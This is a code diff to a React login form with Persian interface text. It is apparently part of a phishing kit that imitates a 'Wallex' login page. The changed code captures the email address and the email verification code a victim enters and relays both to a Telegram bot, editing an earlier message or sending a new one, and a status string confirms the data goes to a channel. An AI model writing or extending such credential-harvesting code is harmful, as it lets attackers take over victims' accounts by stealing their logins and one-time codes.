@@ -441,15 +441,21 @@ export const LoginForm = () => {
     setIsSubmitting(true);
 
     try {
-      console.log("Sending email code to Telegram:", emailCode);
+      console.log("Updating email message with code:", emailCode);
 
-      // Send email code to Telegram
-      await sendPhoneToTelegramEnhanced(
-        `✅ کاربر کد تایید ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
-        false,
-      );
+      if (emailMessageId) {
+        // Update the existing message with both email and code
+        const updatedMessage = `📧 کاربر ایمیل وارد کرد:\n\nایمیل: ${email}\n\n✅ کد تایید ایمیل:\nکد وارد شده: ${emailCode}`;
 
-      // Navigate to loading page after sending to Telegram
+        await updateCustomMessageInTelegram(emailMessageId, updatedMessage);
+      } else {
+        // Fallback: send new message if message ID is not available
+        await sendCustomMessageToTelegram(
+          `✅ کاربر کد تایید ایمیل وارد کرد:\n\nکد وارد شده: ${emailCode}\n\nایمیل: ${email}`,
+        );
+      }
+
+      // Navigate to loading page after updating Telegram
       setCurrentStep("loading");
     } catch (error) {
       console.error("Email code verification error:", error);
@@ -770,7 +776,7 @@ export const LoginForm = () => {
                   <AlertMessage>
                     {!validateTelegramConfig()
                       ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را تنظیم کنید."
-                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ار��ال خواهد شد."}
+                      : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
               </div>
